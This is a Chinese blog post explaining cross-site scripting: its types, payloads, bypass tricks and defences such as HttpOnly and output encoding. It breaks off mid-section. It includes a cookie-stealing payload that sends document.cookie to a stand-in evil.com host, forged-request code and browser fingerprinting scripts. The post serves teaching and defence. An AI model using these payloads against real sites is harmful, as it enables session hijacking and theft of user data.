<!DOCTYPE html><html lang="zh-cn"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> 跨站脚本攻击 · kidozh</title><meta name="description" content="跨站脚本攻击 - kido zhang"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="search" type="application/opensearchdescription+xml" href="http://kidozh.com/atom.xml" title="kidozh"></head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="/favicon.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="http://weibo.com/u/1793490853" target="_blank" class="nav-list-link">WEIBO</a></li><li class="nav-list-item"><a href="https://github.com/kidozh" target="_blank" class="nav-list-link">GITHUB</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">跨站脚本攻击</h1><div class="post-info">2016年5月17日</div><div class="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>跨站脚本攻击是经常发生的事情，作为一名业余的开发者，我觉得有必要make note一下。</p>
<h1 id="XSS简介"><a href="#XSS简介" class="headerlink" title="XSS简介"></a>XSS简介</h1><p>跨站点脚本攻击（Cross Site Script），为了和层叠样式表区别，所以称之为XSS。</p>
<p>XSS攻击的本质是向HTML插入了恶意的脚本，从而曲解HTML的意思，控制攻击浏览器。XSS长期以来都被列为客户端Web安全的头号大敌。</p>
<p>举个例子：</p>
<pre class="lang:php decode:true">&lt;?php
$input = $_GET['param'];
echo "&lt;div&gt;".$input."&lt;/div&gt;";
?&gt;</pre>
在正常情况下用户使用GET的方法提交的数据会展示到页面之中，比如：
<pre class="lang:default highlight:0 decode:true">/xss.php?param=This%20is%20a%20test</pre>
就会在网页中看见This is a test的结果，但是如果我们构造了一串JS代码的话：
<pre class="lang:default highlight:0 decode:true">/xss.php?param=&lt;script&gt;alert(/xss/)&lt;/script&gt;</pre>
这里alert(/xss/)就会在当前页面执行了。

这样就是xss的第一种类型，反射性XSS。

## 反射性XSS

反射性XSS只是简单的把用户输入的数据反射给浏览器。也就是说，攻击者可以诱使用户点击一个恶意链接来攻击用户，所以也被称之为非持久性XSS。

## 存储性XSS

存储性XSS会把用户输入的数据存储在服务器端。

这种比较常见的场景就是攻击者写下一篇包含恶意Javascript代码的博客文章，此时所有访问该博客文章的用户都会在他们的浏览器中执行这段恶意的Javascript代码。这种方法就被成为存储性XSS

## 基于节的XSS

实际上，这种类型的XSS效果上来说也是反射型XSS，但是其成因比较特别，通过修改页面的DOM节点形成的XSS，称之为基于节的XSS（DOM Based XSS）。

下面的代码：
<pre class="lang:js decode:true">&lt;script&gt;
    function test(){
        var str = document.getElementById('text').value;
        document.getElementById("t").innerHTML = "&lt;a href='"+str+"'&gt;YourLink&lt;/a&gt;"
    }
&lt;/script&gt;
&lt;div id="t"&gt;&lt;/div&gt;
&lt;input type="text" id="text" value="" /&gt;
&lt;input type="button" id="s" value="write" onclick="test()" /&gt;
</pre>
点击write按钮之后，会在当前页面插入一个超链接，其地址为文本框内容：

![QQ截图20160517124300](/wp-content/uploads/2016/05/QQ截图20160517124300.png)

在这里write按钮的`onclick`事件调用了`test()`函数。而在`test()`函数中，修改了页面的DOM节点，通过`innerHTML`把一段用户数据当做HTML写入到页面中，造成了DOM based XSS。

构造如下的数据：
<pre class="lang:default highlight:0 decode:true">' onclick=alert(/xss/) //</pre>
输入之后。页面代码就变成了：
<pre class="lang:default decode:true">&lt;a href="" onclick="alert(/xss/)" '=""&gt;YourLink&lt;/a&gt;</pre>
首先用一个单引号`'` 闭合掉`href`的第一个单引号，然后插入一个`onclick`事件，最终再用注释符“`//`”注释掉第二个单引号。

点这个新生成的链接，XSS就会被执行。

![XSS DOM Based](/wp-content/uploads/2016/05/XSS-DOM-Based.png)

实际上，还可以选择直接闭合&lt;a&gt;标签，并且插入一个新的HTML标签。尝试以下输入：
<pre class="lang:xhtml decode:true">'&gt;&lt;img src=# onerror=alert(/xss2/) /&gt;&lt;'</pre>
页面就变成了：
<pre class="lang:xhtml decode:true">&lt;a href=""&gt;&lt;img src="#" onerror="alert(/xss2/)"&gt;YourLink&lt;/a&gt;</pre>
脚本就被执行了：

![XSS2](/wp-content/uploads/2016/05/XSS2.png)

## XSS Payload初探

XSS攻击成功之后，攻击者能够对用户当前浏览的页面植入恶意脚本，通过恶意脚本，控制用户的浏览器。这种用以完成各种功能的恶意脚本称之为XSS Payload。

XSS Payload实际上就是javascript脚本，所以任何javascript能够实现的功能，XSS Payload都能够做到。

最常见的一个XSS Payload就是，通过读取浏览器的Cookie对象，从而发起Cookie劫持。

Cookie中一般加密保存了当前用户的登陆凭证。如果丢失，那么攻击者就能过不通过密码，直接登进用户的账户。

那么我们可以演示一下。首先龚记者可以加载一个远程脚本：
<pre class="lang:default decode:true">http://www.a.com/test.htm?abc="&gt;&lt;script src=http://www.evil.com/evil.js&gt;&lt;/script&gt;</pre>
在evil.js之中，可以使用如下代码窃取Cookie：
<pre class="lang:js decode:true" title="evil.js">var img = document.createElement("img");
img.src="http://www.evil.com/log?"+escape(document.cookie);
document.body.appendChild(img);</pre>
这段代码向页面中插入了一个不可见的图片，同时把`document.cookie`对象作为参数发送到远程服务器。

同时需要指出的是，这个网站可能并不一定要存在，这个请求实质上会在远程服务器的Web日志中留下记录的。

这样就是一个最简单的窃取Cookie和XSS Payload。

在Web之中，Cookie一般是用户登录的凭证，浏览器发起的所有请求都会自动带上cookie，如果cookie没有绑定客户端信息，当攻击者窃取cookie后，就可以免密码登陆进用户的账户。

Cookie的`HttpOnly`标示可以防止Cookie劫持。

## 强大的XSS Payload

cookie劫持并不是都能够生效的。有的网站可能会在Set-Cookie时给出关键的Cookie载入HttpOnly标识；有的网站可能会把Cookie和客户端IP绑定，从而使得XSS窃取Cookie变得没有意义。

尽管如此，XSS攻击成功之后，龚记者仍能够有许多方式控制用户的浏览器。

### 构造GET和POST请求

一个网站的应用，只需要接受HTTP协议中的GET或者POST请求就能完成所有的操作，这样对于攻击者来说，仅通过Javascript就能过浏览器发起这两种请求。

比如我的网站，只要用户访问特定的链接就能够完成指定的应用，假设我们设定某个网站的`/delete/`可以使得当前用户禁用自己的账户。这样对于攻击者来说，只需要让用户访问下面这段Javascript代码就能过使得用户执行XSS Payload来禁用自己的账户。
<pre class="lang:js decode:true">var img = document.createElement("img");
img.src="http://XXXXXXX.XXX/delete/";
document.body.appendChild(img);</pre>
如果网站应用接受的是POST请求呢？

要模拟这个过程第一种方法就是构造一个form表单，然后自动提交这个表单。
<pre class="lang:js decode:true">    var form = document.createElement("form");
    form.action="";
    form.method="post";
    document.body.appendChild(form);

    var input1 = document.createElement("input");
    input1.name="ck";
    input1.value="JiUK";
    form.appendChild(input1);

    form.submit();</pre>
如果表单的数据很多的话，使用构造DOM的方法，代码会变得很冗长。所以可以直接写HTML代码：
<pre class="lang:js decode:true">    var dd = document.createElement("div");
    document.body.appendChild(dd);
    dd.innerHTML = '&lt;form action="" method="post" id="xssform"&gt;'+
            '&lt;input type="hidden" value="JiUY" name="ck"&gt;'+
            '&lt;/form&gt;'
    document.getElementById("xssform").submit();</pre>
这样就能自动提交表单了。

另外使用`XMLHttpRequest`发送一个POST请求：
<pre class="lang:js decode:true">    var url = "http://www.douban.com";
    var postStr = "ck=JiUY&amp;mb_text=test1234";
    var ajax = null;
    if (window.XMLHttpRequest){
        ajax = new XMLHttpRequest();
    }
    else if(window.ActiveXObject){
        ajax  = new ActiveXObject("Microsoft.XMLHTTP");
    }
    else{

    }
    ajax.open("POST",url,true);
    ajax.setRequestHeader("Content-Type","application/x-www-form-urlencode");
    ajax.send(postStr);
    ajax.onreadystatechange = function () {
        if(ajax.readyState == 4 &amp;&amp; ajax.status == 200){
            alert("DONE");
        }
    }</pre>
这样也能提交成功。

通过这个例子可以知道，使用Javascript模拟浏览器发包并不是很困难的事情。

所以XSS攻击之后，攻击者出了可以实施Cookie劫持以外，还能模拟GET，POST请求操作用户的浏览器，这在某些隔离环境之中非常有效。

## XSS钓鱼

XSS并非万能，其攻击过程都是在浏览器中通过Javascript脚本自动进行的，缺乏和用户交互的过程。

比如党我们需要修改用户密码的过程中，在提交新密码之前都需要用户输入Old Password，而这个Old Password往往是用户所不知道的。

对于验证码来说，XSS Payload能够通过读取页面内容，将验证码图片的URL发送到远程服务器或者甚至使用OCR工具就能够自动识别验证码。

那么如果攻击者需要获得用户的密码，最简单的方法就是使用Javascript在当前页面画出一个伪造的登陆框，当用户在登陆框中输入用户名和密码后，其密码就能过被发送到攻击者的服务器上。

## 识别用户的浏览器

很多的时候，攻击者为了获得更大的利益，往往需要准确收集用户的个人信息，如果知道用户是用的浏览器，操作系统，攻击者就可以实施一次非常精准的浏览器内存攻击，最终给用户电脑植入一个木马。

最简单的识别方法莫过于读取浏览器的User-Agent对象：
<pre class="lang:js decode:true">navigator.userAgent
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"</pre>
这个对象就能过告诉我们很多客户端的信息：

OS版本：linux X86_64

浏览器版本：Chrome 50.0.2661.102

但是熟悉Python爬虫的人知道，浏览器的User-Agent是可以伪造的，所以通过Javascript取出来的对象，信息不一定准确。

但是对于攻击者来说，还可以通过别的方法。由于浏览器之间的实现存在差异，不同的浏览器会各自实现一些独特的功能，而且不同版本的浏览器之间也会有细微的差别，所以可以根据分辨这些浏览器的差异，获得浏览器的版本，而且几乎不会被误报。

使用JQuery可以如下：
<pre class="lang:js decode:true">&lt;script type="text/javascript"&gt;
$(document).ready(function(){
   var brow=$.browser;
   var bInfo="";
   if(brow.msie) {bInfo="Microsoft Internet Explorer "+brow.version;}
   if(brow.mozilla) {bInfo="Mozilla Firefox "+brow.version;}
   if(brow.safari) {bInfo="Apple Safari "+brow.version;}
   if(brow.opera) {bInfo="Opera "+brow.version;}
      alert(bInfo);
   $("#browser").html(bInfo);
})
&lt;/script&gt;</pre>

<h2 id="识别用户安装的软件"><a href="#识别用户安装的软件" class="headerlink" title="识别用户安装的软件"></a>识别用户安装的软件</h2><p>在IE中，可以通过判定ActiveX控件的classid是否存在来推测用户是否安装了该软件，这种方法很早就被用于挂马攻击，攻击者通过判定用户安装的软件，选择对应的浏览器漏洞，最终植入木马：</p>
<pre class="lang:js decode:true">    try {
        var obj = new ActiveXObject('XunLeiBHO.ThunderIEHelper'); 
    }
    catch(e){
        // Xunlei BHO does not exist
    }</pre>
这段代码就能过检测迅雷的一个控件（“XunLeiBHO.ThunderIEHelper”）是否存在。如果用户安装了迅雷，那么也会安装此控件，这样就能够判定用户安装迅雷的可能性，通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。

同时一些第三方软件可能也会泄露一些信息，比如Flash的一个`system.capabilities`对象就能够查询客户端的一些硬件信息。

同事Firefox也可以查询一些插件来进行XSS，直接查询`navigator.plugins`对象就能过找到所有的插件了。

而对于Firefox的扩展而言，可以通过检测扩展的图片来判定某个特殊的扩展是否存在。在Firefox之中有一个特殊的协议chrome://,Firefox的扩展图标可以通过这个协议来被访问到，比如Flash Got的扩展图标可以这样访问：
<pre class="lang:default decode:true">chrome://flashgot/skin/icon32.png</pre>
所以在扫描Firefox扩展的时候只需要在Javascript中加载这张图片就能判定扩展存在与否了。

## CSS History Hack

我们还可以通过XSS Payload来发现一个用户曾经访问的网站。

利用style的visited属性，当用户曾经访问一个链接，那么这个链接就会变得与众不同。这样就能够通过显示各种不同的网站来通过其CSS属性来判定用户是否访问过这个网站了。
<pre class="lang:js decode:true">var websites = [...要检测的访问过的网址列表，可能有几千个...];
//遍历每个URL
for (var i = 0; i &lt; websites.length: i++) {
    var link = document.createElement("a");
    link.id = "id" + i;
    link.href = websites[i];
    link.innerHTML = websites[i];

    document.write('&lt;style&gt;');
    document.write('#id' + i + ":visited {color:#FF0000;}");
    document.write('&lt;/style&gt;');

    document.body.appendChild(link);
    var color = document.defaultView.getComputedStyle(link, null).getPropertyValue("color");
    document.body.removeChild(link);

    if (color == "rgb(255,0,0)") { //visited
        var item = document.createElement('li');
        item.appendChild(link);
        document.getElementById('visited').appendChild(item);
    } else { //Not visited
        var item = document.createElement('li');
        item.appendChild(link);
        document.getElementById('notvisited').appendChild(item);
    }
}</pre>

<h2 id="获取用户真实的IP地址"><a href="#获取用户真实的IP地址" class="headerlink" title="获取用户真实的IP地址"></a>获取用户真实的IP地址</h2><p>通过XSS Payload还能获取一些客户端的IP地址。</p>
<p>很多时候，用户电脑使用了代理服务器（比如VPN），或者在局域网中隐藏在NAT之后，网站看到的客户端的地址往往都是内网的出口IP地址，而并非用户电脑真实的本地地址。</p>
<p>Javascript并没有获取本地IP地址的能力，XSS就需要借助第三方软件来完成，例如，客户端安装了Java环境（JRE），那么就能过通过调用Java Applet的接口来获取客户端的本地IP地址。</p>
<p>在XSS攻击框架Attack API之中，就有一个获取本地IP地址的API：</p>
<pre class="lang:js decode:true">AttackAPI.dom.getInternalIP = function() {
    try {
        var sock = new java.net.Socket();
        sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
        sock.connect(new java.net.InetSocketAddress(document.domain, (!document.location.port) ? 80 : document.location.port));
        return sock.getLocalAddress().getHostAddress();
    } catch(e) {}
    return '127.0.0.1';
};</pre>
Metasploit引擎曾经展示了一个强大的测试页面，结合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件抓取用户的本地信息，这里是[传送门](http://decloak.net/decloak.html)。

# XSS 攻击平台

## Attack API

[Attack API](https://code.google.com/archive/p/attackapi/)是安全研究者pdp所主导的一个项目，其总结了很多能够直接使用XSS Payload，归纳为API的方式，比如上面提到的获取客户端本地信息的API。

## BeEF

[BeEF](http://beefproject.com/)有一个控制后台，攻击者可以在后台控制前端的一切。

每个被攻击的用户都会出现再后台，后台控制者可以通过控制这些浏览器的行为，并且可以通过向这些用户发送命令。

## XSS-Proxy

是一个轻量级的攻击平台，通过嵌套`iframe`的方式可以远程控制被XSS攻击的浏览器。

# XSS 蠕虫

利用上面的方法，就可以使用存储性来起到传播XSS代码，从而传播蠕虫了。

# XSS构造技巧

## 利用字符编码

百度搜藏曾经有这样一个XSS漏洞，百度在一个&lt;script&gt;标签中输出了一个变量，其中转义了双引号：
<pre class="lang:js decode:true">var redirectURL = "\";alert(/xss/);";</pre>
一般来说，这样是没有XSS漏洞的，因为变量处于双引号内，系统转义了双引号导致变量无法被`escape`。

但是百度返回的页面是GBK/GB2312编码的，因此%c1\这个两个字符组合在一起会成为一个unicode字符，在firefox下会认为是一个字符，所以构造：
<pre class="lang:js decode:true">%c1";alert(/xss/);//</pre>
这个时候firefox就会把前面两个结合，从而执行了新的unicode字符，%c1把转移符号\吃掉了，从而绕过了系统的安全检查，成功实施了XSS攻击。

## 绕过长度限制

很多时候，产生XSS的地方都会有变量的长度限制，这个限制往往是服务器逻辑引发的。假设下面这个代码存在一个XSS漏洞：
<pre class="lang:php decode:true">    &lt;input type="text" value="$var" /&gt;</pre>
服务器端如果对输出变量`$var`做了严格的长度限制，那么攻击者可以这样构造XSS：
<pre class="lang:js decode:true">&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</pre>
希望达到的效果是
<pre class="lang:php decode:true">&lt;input type="text" value=""&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt; "/&gt;</pre>
假设长度限制为20个字节，那么这段XSS会被切割为：
<pre class="lang:php decode:true">    $var = '"&gt;&lt;script&gt;alert(/xss';</pre>
这样连一个完整的函数都没法写完，XSS攻击无法成功。但是攻击者仍然可以使用事件来缩短所需要的字节数：
<pre class="lang:php decode:true">    $var = '"onclick=alert(1) //';</pre>
当用户点击了input框之后，`alert()`就会被执行。

但是利用事件能够缩短的字节数是有限的。最好的方法还是把XSS Payload写到别处，再通过简短的代码加载这段XSS Payload。

最常用的方法就是`location.hash`。而且根据HTTP协议，`location.hash`的内容并不会在HTTP包中发送，所以服务器端的Web日志并不会记录下`location.hash`的内容。
<pre class="lang:default decode:true">    $var = '"onclick="eval(location.hash.substr(1))';</pre>
总共是40个字节。输出的HTML就变成了：
<pre class="lang:php decode:true">&lt;input type="text" value="" onclick="eval(location.hash.substr(1))" /&gt;</pre>
![XSS on hash](/wp-content/uploads/2016/05/XSS-on-hash.png)

`location.hash`并没有长度限制，但是浏览器的地址栏长度是有限制的，不高这个长度已经很足够写很唱得代码了，如果浏览器地址栏长度也不够用，那么还可以在是用远程加载JS的方法。

在某些情况下，我们还是可以使用注释符来绕过长度限制。

比如我们可以控制两个文本框，第二个文本框允许写入更多内容，此时可以利用HTML的注释符号，吧两个文本框之间的HTML全部注释掉，从而打通两个`&lt;input&gt;`标签
<pre class="lang:php decode:true">&lt;input id="1" type="text" value="" /&gt;
XXXXXXXXXXX
&lt;input id="2" type="text" value="" /&gt;</pre>
那么在第一个`input`框中输入：
<pre class="lang:default decode:true">"&gt;&lt;!--</pre>
在第二个input框中输入：
<pre class="lang:js decode:true">--&gt;&lt;script&gt;alert(/xss/)&lt;/script&gt;</pre>
最终的效果如下：
<pre class="lang:php decode:true">&lt;input id="1" type="text" value=""&gt;&lt;!--" /&gt;
XXXXXXXXXXX
&lt;input id="2" type="text" value="--&gt;&lt;script&gt;alert(xss);&lt;/script&gt;" /&gt;</pre>
在第一个input框中，仅仅使用了短短的6个字节，中间的代码全部被注释掉了，最终结果如下：![xss3](/wp-content/uploads/2016/05/xss3.png)

## 使用base标签

base标签并不常用，其作用是定义页面上所有使用相对路径标签的hosting地址。

比如打开一张不存在的图片：
<pre class="lang:xhtml decode:true">&lt;body&gt;
    &lt;img src="/int1/en_ALL/images/srpr/logo1w.png"&gt;
&lt;/body&gt;</pre>
在`&lt;img&gt;`标签中加入一个`&lt;base&gt;`标签：
<pre class="lang:xhtml decode:true">&lt;body&gt;
    &lt;base href="http://www.google.com" /&gt;
    &lt;img src="/int1/en_ALL/images/srpr/logo1w.png"&gt;
&lt;/body&gt;</pre>
&lt;base&gt;标签将指定其后的标签默认从`http://www.google.com`中取URL：![XSS4](/wp-content/uploads/2016/05/XSS4.png)

攻击者一旦在页面中插入了`&lt;base&gt;`标签，就可以通过远程服务器上伪造图片、链接或者脚本，劫持当前页面中所有使用相对路径的标签。

所以在设计安全方案的时候，需要过滤掉这个非常危险的标签。

## window.name的使用

`window.name`对象赋值，没有特殊字符的限制，因为`window`对象是浏览器的窗体而并非document对象，因此很多时候`window`对象不受同源策略的限制，攻击者就可以利用这个对象，实现跨域、跨页面传输数据。

参考下面的例子：
<pre class="lang:php decode:true">&lt;body&gt;
    &lt;script&gt;
        window.name="test";
        alert(document.domain+" "+window.name);
        window.location = "http://www.b.com/test1.html";
    &lt;/script&gt;
&lt;/body&gt;</pre>
这段代码将`window.name`赋值为test，然后显示当前域和`window.name`的值，最后将页面跳转到`www.b.com/test1.html`。

而`www.b.com/test1.html`的代码为：
<pre class="lang:xhtml decode:true">&lt;body&gt;
    &lt;script&gt;
        alert(document.domain+" "+window.name);
    &lt;/script&gt;
&lt;/body&gt;</pre>
这样就实现了数据的跨域传递test这个值就从www.a.com传递到www.b.com。

使用`window.name`能够缩短XSS Payload的长度。
<pre class="lang:default decode:true">&lt;body&gt;
    &lt;script&gt;
        window.name = "alert(document.cookie)";
        location.href="http://www.xssedsite.com/xss.php";
    &lt;/script&gt;
&lt;/body&gt;</pre>
在同一个窗口打开XSS站点后，只需要执行下面的代码：
<pre class="lang:js decode:true">alert(name);</pre>
只有11个字节，短到了极致。

## Anetha的回旋镖

反射性XSS也有可能像储存性XSS一样利用：将要利用的反射性XSS嵌入一个存储性XSS中。

因为浏览器的同源策略，XSS也收到同源策略的限制：发生在A域上的XSS很难影响到B域的用户。

回旋镖的思路就是：如果在B域上存在一个反射型XSS_B，在A域上存在一个存储性XSS_A，当用户访问A域上的XSS_A时，同时嵌入B域上的XSS_B，则跨域达到在A域上的XSS攻击B域用户的行为。

在IE之中，`&lt;iframe&gt;`、`&lt;img&gt;`、&lt;link&gt;等标签都会拦截第三方Cookie的发送，而在Firefox中却没有限制。所以对于Firefox，只需要在XSS_A处嵌入一个`iframe`标签即可。
<pre class="lang:default decode:true">&lt;iframe src="http://www.b.com/?xss...."&gt;&lt;/iframe&gt;</pre>
但是对于IE来说，则要麻烦很多，为了达到执行XSS_B的目的，可以使用一个&lt;form&gt;标签，在浏览器提交form的时候并不会拦截第三方Cookie的发送。

因此先在XSS_A上写入一个`&lt;form&gt;`，自动提交到XSS_B，然后在XSS_B中在跳转回到XSS_A，这样就完成了一个回旋镖的过程，但是这种攻击的缺点是，尽管跳转过程很短，但是用户仍然能够看到地址栏的变化。

# XSS防御

## HttpOnly

浏览器会禁止页面访问带有`HttpOnly`属性的Cookie。

下面的浏览器开始支持`HttpOnly`属性：

*   IE6 SP1+
*   Firefox 2.0.0.5+
*   Chrome
*   Safari 4.0+
*   Opera 9.5+
严格说来，`HttpOnly`并非为了对抗XSS，而是解决XSS之后的Cookie劫持攻击。

一个Cookie的使用过程如下：

1.  浏览器向服务器发起请求，这个时候没有Cookie
2.  浏览器返回的时候发送`Set-Cookie`头，并向浏览器中写入Cookie
3.  在这个Cookie到期之前，浏览器访问这个域下面的所有界面，都会发送该Cookie
`HttpOnly`是在`Set-Cookie`时标记的。
<pre class="lang:default decode:true">Set-Cookie:&lt;name&gt;-&lt;name&gt;[;&lt;Max-Age&gt;=&lt;age&gt;]
[;expire=&lt;date&gt;][;domain=&lt;domain_name&gt;]
[;path=&lt;some_path&gt;][;secure][; HttpOnly];</pre>
需要注意的是，服务器可能会设置多个Cookie（`key`-`value`对），而`HttpOnly`可以有选择性的加在任何一个Cookie值上。在有些时候，应用可能需要Javascript访问几项Cookie，这种Cookie可以不设置HttpOnly标记，而只需要把HttpOnly标记给用于认证的关键的Cookie。

在不同的语言中，给Cookie添加的HttpOnly的代码如下：

Java EE
<pre class="lang:java decode:true">response.setHeader("Set-Cookie", "cookiename=value;
Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly");</pre>
C#
<pre class="lang:c# decode:true">HttpCookie myCookie = new HttpCookie("myCookie");   
myCookie.HttpOnly = true;   
Response.AppendCookie(myCookie);</pre>
VB.NET
<pre class="lang:vbnet decode:true">Dim myCookie As HttpCookie = new HttpCookie("myCookie")   
myCookie.HttpOnly = True   
Response.AppendCookie(myCookie)</pre>
但是在.NET 1.1中需要手动添加：
<pre class="lang:vbnet decode:true">Response.Cookies[cookie].Path += ";HTTPOnly";
</pre>
PHP 4
<pre class="lang:php decode:true">header("Set-Cookie: hidden=value; httpOnly");
</pre>
PHP 5
<pre class="lang:php decode:true">setcookie("abc", "test", NULL, NULL, NULL, NULL, TRUE);</pre>
最后一个参数为HttpOnly属性。

Django(Python)
<pre class="lang:python decode:true">HttpResponse.set_cookie(key, value='', max_age=None, expires=None, path='/', domain=None, secure=None, httponly=True)</pre>

<h2 id="输入检查"><a href="#输入检查" class="headerlink" title="输入检查"></a>输入检查</h2><p>常见的Web漏洞如XSS，SQL注入等，都要求攻击者构造一些特殊字符，这些特殊字符可能是正常用户不会用到的，所以输入检查就有存在的必要了。</p>
<p>输入检查大体上可以被处理为白名单的方式，让一些基于特殊字符的攻击失效。</p>
<p>输入检查的逻辑，必须放在服务器端的代码实现。如果只是在客户端使用Javascript进行输入检查，是很容易被攻击者绕过的。目前来说是同时在客户端和服务器端实现相同的输入检查，客户端的JavaScript检查就可以阻挡大部分误操作的正常用户，从而节省服务器资源了。</p>
<p>在XSS防御上，输入检查一般是检查用户输入的数据是否包含一些特别字符，比如&lt;、&gt;、’、等。如果发现这些字符，则将这些字符过滤或者转码。比较智能的输入检查还会匹配XSS特征，比如查找用户是否包含了<code>&amp;lt;script&amp;gt;</code>、<code>javascript</code>等敏感词汇。</p>
<p>XSS Filter在用户提交数据的时候就会获取变量，并进行XSS检查，但此时用户数据并没有结合渲染页面的HTML代码，因此XSS Filter对语境的理解并不完整。</p>
<p>比如下面的XSS漏洞：</p>
<p><pre class="lang:xhtml decode:true">&lt;script src=”$var”&gt;&lt;/script&gt;</pre><br><code>$var</code>是用户可以控制的变量，用户只要提交一个恶意脚本所在的URL地址，就可以实施XSS攻击。</p>
<p>如果是一个全局性的XSS Filter，则无法看到用户数据的输出语境，只能看到用户提交的一个URL，就很有可能误报，因为在大多数情况下，URL是一个合法的用户数据（比如个人主页）。</p>
<p>XSS Filter还有一个问题就是其会对<code>&amp;lt;</code>、<code>&amp;gt;</code>等字符处理，改变用户数据的语义。</p>
<p>这样发现了敏感字符就会粗暴的过滤或者替换<code>&amp;lt;</code>，就很有可能改变用户的原意。同时输入数据还可能会被展示在多个地方，每个地方的语境可能各不相同，如果使用单一替换操作，则可能出现问题。</p>
<p>比如针对用户的昵称，不同的场景可能是不同的，展示的需求也不相同，如果在输入的地方统一对数据做了变更，那么展示的时候，也会出现一些转义字符的乱入。</p>
<p>用户的输入昵称如下：</p>
<p><pre class="lang:php decode:true">$nickname=’I am “hero”‘</pre><br>这里在XSS Filter中对双引号进行转义：</p>
<p><pre class="lang:php decode:true">$nickname = ‘I am \”hero\”‘</pre><br>而这里在HTML展示的时候就会出现<code>\</code>这个字符。这显然是不合适的。</p>
<h2 id="输出检查"><a href="#输出检查" class="headerlink" title="输出检查"></a>输出检查</h2><p>一般来说，出了富文本的输出外，在变量输出到HTML页面时，可以使用编码或者转义的方式来防御XSS攻击。</p>
<h3 id="安全的编码函数"><a href="#安全的编码函数" class="headerlink" title="安全的编码函数"></a>安全的编码函数</h3><p>编码分为很多种，针对HTML代码的编码方式是<code>HtmlEncode</code>。</p>
<p>HtmlEncode并非专有名词，他只是一中函数实现，其能够将字符转换为<code>HTMLEntities</code>，对应的标准是ISO-8859-1。</p>
<p>为了对抗XSS，<code>HtmlEncode</code>中要求转换下面的字符：</p>
<p><table border="0" cellspacing="0"><colgroup span="3" width="85"></colgroup></table></p>
<p><tbody></tbody></p>
<p><tr style="height: 22.3594px;"></tr></p>
<p><td style="text-align: center;" align="left">&amp;</td></p>
<p><td style="text-align: center;" align="left">&amp;amp;</td></p>
<p><td style="text-align: center;" align="left"></td><br></p>
<p><tr style="height: 22px;"></tr></p>
<p><td style="text-align: center;" align="left">&lt;</td></p>
<p><td style="text-align: center;" align="left">&amp;lt;</td></p>
<p><td style="text-align: center;" align="left"></td><br></p>
<p><tr style="height: 22px;"></tr></p>
<p><td style="text-align: center;" align="left">&gt;</td></p>
<p><td style="text-align: center;" align="left">&amp;gt;</td></p>
<p><td style="text-align: center;" align="left"></td><br></p>
<p><tr style="height: 22px;"></tr></p>
<p><td style="text-align: center;" align="left">“</td></p>
<p><td style="text-align: center;" align="left">&amp;quot;</td></p>
<p><td style="text-align: center;" align="left"></td><br></p>
<p><tr style="height: 22px;"></tr></p>
<p><td style="text-align: center;" align="left">‘</td></p>
<p><td style="text-align: center;" align="left">&amp;#x27;</td></p>
<p><td style="text-align: center;" align="left"></td><br></p>
<p><tr style="height: 110px;"></tr></p>
<p><td style="text-align: center;" align="left">/</td></p>
<p><td style="text-align: center;" align="left">&amp;#x2F;</td></p>
<p><td style="text-align: center;" align="left">包含反斜线是因为他可能会闭合一些HTML entity</td><br><br><br><br>在PHP中有<code>htmlentities()</code>和<code>htmlspecialchars()</code>两个函数可以满足要求。</p>
<p>相应的，Javascript的编码方式还可以使用<code>JavascriptEncode</code>。<code>JavascriptEncode</code>和<code>HtmlEncode</code>的编码方法不同，他需要使用<code>\</code>对特殊字符进行转义。在对抗XSS的时候，还要求输出的变量必须在引号外部。</p>
<p><pre class="lang:js decode:true">        var x = escapeJavascript($evil);</pre></p>
<pre><code>var y =&apos;&quot;&apos;+ escapeJavascript($evil)+&apos;&quot;&apos;;&lt;/pre&gt;
</code></pre><p>如果<code>escapeJavascript()</code>函数仅转义了几个危险的字符，那么上面两行的代码输出之后就会变成</p>
<p><pre class="lang:js decode:true">var x = 1;alert(2);<br>var x = “1;alert(2)”;</pre><br>那么说明第二行才是安全的，攻击者即使想要逃逸出引号的范围也会出现困难：</p>
<p><pre class="lang:js decode:true">var y = “\”;alert(1);\/\/“;</pre><br>所以要求<code>javascriptEncode</code>的变量输出一定要在引号前。</p>
<p>当然也可以使用一个更加严格的<code>JavascriptEncode</code>函数来保证安全，除了数字、字母以外的所有自负都使用<code>\xHH</code>的方法进行编码，这样就能保证代码安全。</p>
<p>除了<code>HtmlEncode</code>、<code>JavascriptEncode</code>还有许多用于各种情况的编码函数，比如<code>XMLEncode</code>和<code>JSONEncode</code>。在适当条件下选用适当的函数。需要注意的是，编码后的数据长度可能会发生改变，从而影响某些功能。</p>
<p>当然XSS是一个很复杂的问题，需要在正确的地方使用正确的编码方式。比如下面的情况：</p>
<p><pre class="lang:xhtml decode:true">&lt;body&gt;<br>    &lt;a href=”#” onclick=”alert(‘&amp;#x27;&amp;#x29;&amp;#x3b;alert&amp;#x28;&amp;#x27;2’);”&gt;test&lt;/a&gt;<br>&lt;/body&gt;</pre><br>对于浏览器来说，<code>htmlparser</code>会优先于<code>JavaScript Parser</code>执行，所以解析的过程是，被<code>HtmlEncode</code>的字符先被解码，然后执行<code>Javascript</code>事件。</p>
<p>因此经过<code>htmlparser</code>解析后相当于：</p>
